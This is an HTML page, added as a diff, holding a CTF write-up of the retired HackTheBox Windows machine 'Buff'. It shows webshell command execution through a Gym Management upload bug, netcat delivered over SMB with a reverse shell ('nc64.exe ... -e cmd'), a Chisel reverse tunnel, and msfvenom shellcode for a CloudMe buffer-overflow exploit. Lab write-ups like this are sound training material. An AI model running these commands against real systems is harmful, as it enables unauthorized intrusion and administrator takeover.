@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Buff &middot; Writeups</title>
+<link rel="stylesheet" href="style.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+</head>
+<body>
+<header class="topbar">
+  <a class="home" href="./index.html">&larr; all writeups</a>
+  <span class="brand">SAMSON &middot; CTF</span>
+</header>
+<main class="article">
+  <div class="boxhead">
+    <div class="bh-left">
+      <span class="badge htb">HTB</span>
+      <span class="badge os">Windows</span>
+      <span class="badge deep">in-depth</span>
+    </div>
+    <h1>Buff</h1>
+    <div class="meta">Target: <code>10.10.14.126</code></div>
+    <div class="tags"><span class="tag">Windows</span><span class="tag">CVE</span><span class="tag">GymManagementSoftware</span><span class="tag">RCE</span><span class="tag">chisel</span><span class="tag">tunneling</span><span class="tag">CloudMe</span><span class="tag">BufferOverflow</span><span class="tag">msfvenom</span></div>
+  </div>
+  <div class="layout">
+    <nav class="toc"><a class="lvl2" href="#overview">Overview</a><a class="lvl2" href="#recon">Recon</a><a class="lvl2" href="#foothold">Foothold</a><a class="lvl3" href="#gym-management-1-0-unauthenticated-rce">Gym Management 1.0 Unauthenticated RCE</a><a class="lvl3" href="#smb-delivery-of-netcat">SMB Delivery of netcat</a><a class="lvl2" href="#privilege-escalation">Privilege Escalation</a><a class="lvl3" href="#finding-the-internal-service">Finding the Internal Service</a><a class="lvl3" href="#chisel-reverse-tunnel">Chisel Reverse Tunnel</a><a class="lvl3" href="#cloudme-1-11-2-buffer-overflow">CloudMe 1.11.2 Buffer Overflow</a><a class="lvl2" href="#root">Root</a><a class="lvl2" href="#takeaways">Takeaways</a></nav>
+    <article class="body"><h2 id="overview">Overview</h2>
+<p>Buff is an easy Windows box that strings together two CVEs and a pivot. The foothold is an unauthenticated RCE in <strong>Gym Management System 1.0</strong>, which drops a webshell. Because outbound payloads are locked down, I deliver <code>nc</code> over SMB to get a real shell as <code>shaun</code>. Privilege escalation is a classic pivot: a <strong>CloudMe</strong> instance listening only on localhost, reached through a <strong>Chisel</strong> reverse tunnel, then popped with a public buffer-overflow exploit to land as <code>administrator</code>.</p>
+<h2 id="recon">Recon</h2>
+<p>Port 8080 serves a gym site that advertises its own software and version:</p>
+<pre><code>mrb3n's Bro Hut — Made using Gym Management Software 1.0
+</code></pre>
+<p>A known-version fingerprint like that is a direct line to an exploit.</p>
+<h2 id="foothold">Foothold</h2>
+<h3 id="gym-management-1-0-unauthenticated-rce">Gym Management 1.0 Unauthenticated RCE</h3>
+<p>The <a href="https://www.exploit-db.com/exploits/48506">exploit</a> uploads a PHP webshell via an unauthenticated file-upload bug. The ExploitDB script uploaded successfully but couldn't run commands for me, so I used <a href="https://github.com/0xConstant/Gym-Management-1.0-unauthenticated-RCE">0xConstant's variant</a>, which executes commands through a URL parameter on the uploaded shell:</p>
+<pre><code>http://10.129.106.143:8080/upload/kamehameha.php?telepathy=whoami
+-&gt;  buff\shaun
+</code></pre>
+<blockquote>
+<p><strong>Why the parameter matters:</strong> the uploaded <code>kamehameha.php</code> reads a query-string parameter (<code>telepathy</code>) and passes it to the OS. So every command is just another GET request. It's RCE, but a clumsy one, no interactivity, and this box's command set was restricted enough that reverse-shell one-liners failed.</p>
+</blockquote>
+<h3 id="smb-delivery-of-netcat">SMB Delivery of netcat</h3>
+<p>Since I couldn't fetch tools over HTTP, I mounted a Kali SMB share on the target and copied <code>nc64.exe</code> across, then executed it, all through the webshell parameter:</p>
+<pre><code class="language-sh">impacket-smbserver -smb2support newShare . -username test -password test
+</code></pre>
+<pre><code>?telepathy=net use z: \\10.10.14.126\newShare /u:test test
+?telepathy=copy z:\nc64.exe .
+?telepathy=.\nc64.exe 10.10.14.126 443 -e cmd
+</code></pre>
+<pre><code class="language-sh">rlwrap nc -lvnp 443
+C:\xampp\htdocs\gym\upload&gt;whoami
+buff\shaun
+</code></pre>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="finding-the-internal-service">Finding the Internal Service</h3>
+<p>Listing listening ports revealed two services bound to localhost only:</p>
+<pre><code>TCP  127.0.0.1:3306  Listening   mysqld.exe
+TCP  127.0.0.1:8888  Listening   CloudMe
+</code></pre>
+<p><strong>CloudMe</strong> on <code>8888</code> is the target, it has a well-known buffer overflow, but it's not reachable from outside the host.</p>
+<h3 id="chisel-reverse-tunnel">Chisel Reverse Tunnel</h3>
+<blockquote>
+<p><strong>What the tunnel does:</strong> the CloudMe port is firewalled to localhost, so I can't hit it from Kali directly. Chisel builds an encrypted tunnel: the target connects <em>out</em> to my Chisel server, and I tell it to forward the target's <code>localhost:8888</code> back to <em>my</em> <code>localhost:8888</code>. Now my exploit can target <code>127.0.0.1:8888</code> on Kali and reach CloudMe on the box.</p>
+</blockquote>
+<pre><code class="language-sh"># Kali (server)
+chisel server -p 8000 --reverse
+</code></pre>
+<pre><code class="language-powershell"># Target (client) — reverse-forward 8888
+.\c.exe client 10.10.14.126:8000 R:8888:localhost:8888
+</code></pre>
+<p><code>netstat</code> on Kali confirmed <code>8888</code> was now listening locally through the tunnel.</p>
+<h3 id="cloudme-1-11-2-buffer-overflow">CloudMe 1.11.2 Buffer Overflow</h3>
+<p><code>searchsploit cloudme</code> pointed at the <a href="https://www.exploit-db.com/exploits/48389">1.11.2 BOF PoC</a>. I swapped the calc.exe shellcode for a reverse shell, bad-char filtered, targeting the tunneled port:</p>
+<pre><code class="language-sh">msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=8080 -b '\x00\x0A\x0D' -f python -v payload
+</code></pre>
+<p>Running the exploit through the tunnel returned a shell as <code>administrator</code> (CloudMe runs with high privilege):</p>
+<pre><code class="language-sh">rlwrap nc -lvnp 8080
+C:\Windows\system32&gt;whoami
+buff\administrator
+</code></pre>
+<h2 id="root">Root</h2>
+<p>Box rooted.</p>
+<h2 id="takeaways">Takeaways</h2>
+<ul>
+<li><strong>Version strings are exploit shortcuts.</strong> "Gym Management 1.0" mapped straight to an unauth RCE.</li>
+<li><strong>When egress is restricted, deliver tools over SMB</strong> and execute via the webshell, <code>net use</code> + <code>copy</code> beats a blocked HTTP download.</li>
+<li><strong>Enumerate localhost-only services and tunnel to them.</strong> Chisel reverse-forwarding turned an unreachable internal CloudMe into a local target, and a known BOF finished the job as admin.</li>
+</ul></article>
+  </div>
+</main>
+<footer class="foot">Samson Laird &middot; retired-machine writeups &middot; secrets redacted</footer>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>hljs.highlightAll();</script>
+</body>
+</html>
